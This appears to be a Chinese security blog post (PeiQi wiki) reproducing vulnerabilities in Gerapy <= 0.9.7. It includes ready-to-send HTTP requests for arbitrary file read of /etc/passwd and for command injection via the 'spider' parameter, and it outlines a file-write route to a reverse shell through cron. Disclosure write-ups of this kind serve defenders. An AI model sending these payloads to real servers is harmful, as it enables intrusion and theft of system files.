<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-TkfZru1ED-YRxhPMjPJsA)

![](https://mmbiz.qpic.cn/mmbiz_png/zNJ4YhKaok3WXGGiakxKvlOQZLV0DRA0Cibptxv2DC9Sxn5MZ24FrEryKEoqwL0LxgYGYB3HupicCAfYosueeazWA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Wzg6H7uiaEUuONjaSQqwX0liaZMe7ialQk3tOTL7w9MgXuWJrhs95uprpscHr9JSmJ8H2ZAtmRETBREKhcb50sAicg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el6a9EO2exy5AFj6pyO3xjLjCvXiayia3VzRoBiaPUGUibZianO7NicvwetrANBiaRAal6JYKtLxePgArcScw/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/Z1N0HbVwRiaYV3wjJl8bEXPBWw9okzgfDRibxBvM3Ofb08BhgNtK9icic7u9siclk7vGDSria8xYtt4GF1C0CgpialYJQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XQNU4yRQkQFWGKHbJOQg3ue2dEI05MmEguiaXzdichLTxcgma0htf9HVwjchWAgFWnJGpyy9S98e7kfpX4GfTBEQ/640?wx_fmt=png)

**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**  

![](https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png)

**一****：漏洞描述🐑**

  

继昨天那篇文章的漏洞预警，对该项目再次审计  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oBu04EUNfWTibexlPznqkvy9AF66CSUlMic13ew5uJd4vt3436CaBL1Af2NpA6AYQYXBhSxpjcDJw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png)

二:  漏洞影响🐇

  

Gerapy <= 0.9.7

![](https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png)

三:  漏洞复现🐋

  

登录页面

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6a9EO2exy5AFj6pyO3xjLjnwKJm2TGic99zA1JX9BqErp57vicJAZTX3ibucQIdt6EmNYAlCNTyMTJQ/640?wx_fmt=png)

  

我们首先先查看关键接口文件 gerapy/server/core/urls.py

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oBu04EUNfWTibexlPznqkvJ1zAGPFCBMyzfkvBZQrjpfL1AqTTkiaK5kYnMOYH8BiaHQzuIXD43gPw/640?wx_fmt=png)

  

可以看到 api/project/file/read 接口可能与文件读取相关，查看调用的文件  

gerapy/server/core/views.py 中的 project_file_read 方法  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oBu04EUNfWTibexlPznqkvTOVMkfupQeOialAQTQGUyR0Uviczibwv7Ax5mpKkKtyLXhILAqtfJjeLg/640?wx_fmt=png)

```
@api_view(['POST'])
@permission_classes([IsAuthenticated])
def project_file_read(request):
    """
    get content of project file
    :param request: request object
    :return: file content
    """
    if request.method == 'POST':
        data = json.loads(request.body)
        path = join(data['path'], data['label'])
        # binary file
        with open(path, 'rb') as f:
            return HttpResponse(f.read().decode('utf-8'))
```

  

path 参数与 label 参数皆可控，攻击者只需要传入 json 数据构造特殊请求就可以读取服务器中的文件  

```
POST /api/project/file/read HTTP/1.1
Host: 
Content-Length: 35
Accept: application/json, text/plain, */*
Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close

{"path":"/etc/", "label":"passwd"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oBu04EUNfWTibexlPznqkv1IffqpWkbkcxa4dGypib0U4rhdsKeyokkIVQeJUp8A8muSK07K09PXw/640?wx_fmt=png)

  

我们再继续向下看一些接口，根据漏洞预警描述官方更新最新版已经把昨天说的那个 git clone 命令拼接修复了，我们需要再寻找一个方式获取权限

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oBu04EUNfWTibexlPznqkvBfd2yqwHWlhRDiah20Ts1xibRceJg4YnOAoq1JSztusl8wTxxPWMujWg/640?wx_fmt=png)

  

我们找到一个参数  spider 为可控参数，使用 Popen 命令执行时我们可以拼接命令造成命令注入，看一下方法对应的 URl 接口  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oBu04EUNfWTibexlPznqkvG1d1yic7REEDecVC42UOwoqjSVHibQU5peXLNN9VA3E3CTm0Tvt6tQgQ/640?wx_fmt=png)

  

构造请求包测试命令执行

```
POST /api/project/1/parse HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/plain, */*
Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Content-Length: 18

{"spider":";`id`"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oBu04EUNfWTibexlPznqkvhyukViasl2hHIqWoaNsv3UNc0IuNCR6xZF00NoUq4ZOoXdygIMr7zoQ/640?wx_fmt=png)

```
我们再往下看文件更新部分代码
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oBu04EUNfWTibexlPznqkvphOscAjPEF1BYJ3TibYR6KYMjG4TaW7uHBVDdRkBmrDPFq8Lfx5Im7g/640?wx_fmt=png)

  

path lable code 参数均为用户可控，就导致了任意文件的写入了, 一般项目权限为 root，可以通过写定时任务等方法反弹 shell，用之前任意文件读取确认文件的写入  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oBu04EUNfWTibexlPznqkvjCorcbJykibrSrFlES2ZOtGaNIgZVLicX2VGJh5zsacZtHibkplLB5v2g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7oBu04EUNfWTibexlPznqkveGZ2YrtO1GkdmibVX4aNE3e4ExHjEAzAUQOJuD69PwW5P4YgsBzeytA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/64HEibicwoTVPB8smnhdVoc7JbSaYqwqvrUcgmufsMThIEejT2UyKBJha6pdibPxAIGLoTibtmG5CvC73DzZ0ubv1Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4R3RgYzzCgG6fvduwiaD0Uzhd9MCO2xZfIttlKGLlzCNCTnAXk4QJyeBoRuDmSMgIMrBricSrdV6F5tH6OGGj80g/640?wx_fmt=png)

 四:  关于文库🦉

  

https://www.yuque.com/peiqiwiki

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6a9EO2exy5AFj6pyO3xjLjbpcJlmpuPWPCYWibAOJrnm6f10nhxo5zCqPhkhHcgKeuIkr4D2N4cvQ/640?wx_fmt=png)

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuHPQeSEAhRof2olkAM9ZghicpNv0p8rRbtNCZJL4t82g15Va8iahlCWeg/640?wx_fmt=png)

**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**

**PeiQi 文库 拥有对此文章的修改和解释权如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**